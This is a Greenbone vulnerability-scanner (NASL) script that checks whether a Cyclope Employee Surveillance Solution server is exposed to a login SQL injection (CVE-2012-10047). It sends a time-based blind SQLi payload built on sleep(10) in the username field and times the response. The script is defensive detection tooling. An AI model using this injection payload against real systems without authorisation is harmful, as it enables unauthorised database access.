# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803006");
  script_version("2025-08-21T05:40:06+0000");
  script_tag(name:"last_modification", value:"2025-08-21 05:40:06 +0000 (Thu, 21 Aug 2025)");
  script_tag(name:"creation_date", value:"2012-08-14 10:50:03 +0530 (Tue, 14 Aug 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2012-10047");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Cyclope Employee Surveillance Solution < 6.2.1 SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl");
  script_require_ports("Services/www", 7879);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Cyclope Employee Surveillance Solution is prone to an SQL
  injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP POST requests and checks the
  responses.");

  script_tag(name:"insight", value:"Input passed to 'username' and 'password' parameter in
  '/index.php' page is not properly verified before being used in SQL queries.");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL
  queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"Cyclope Employee Surveillance Solution version 6.0.8.5 and
  prior.");

  script_tag(name:"solution", value:"Update to version 6.2.1 or later.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20120813080647/http://secunia.com/advisories/50200/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/20393");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/20501");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/115406/cyclope-sql.txt");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:7879);

if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);

url = "/index.php";

rcvRes = http_get_cache(item:url, port:port);

if(rcvRes && rcvRes =~ "HTTP/1.. 200" && "<title>Cyclope" >< rcvRes &&
   "Cyclope Employee Surveillance Solution" >< rcvRes)
{
  postdata1 = "act=auth-login&pag=login&username=xxx&password=aaa";

  req1 = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postdata1), "\r\n",
                "\r\n", postdata1);

  nor_start1 = unixtime();

  res = http_keepalive_send_recv(port:port, data:req1);

  nor_stop1 = unixtime();

  postdata2 = "act=auth-login&pag=login&username=x%27+or+sleep%2810%29+and+" +
              "%271%27%3D%271&password=aaa";

  req2 = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postdata2), "\r\n",
                "\r\n", postdata2);

  nor_start2  = unixtime();

  res = http_keepalive_send_recv(port:port, data:req2);

  nor_stop2 = unixtime();

  if(res && res =~ "HTTP/1.. 200" && (nor_stop1 - nor_start1) < 2
     && (nor_stop2 - nor_start2 > 10))
  {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
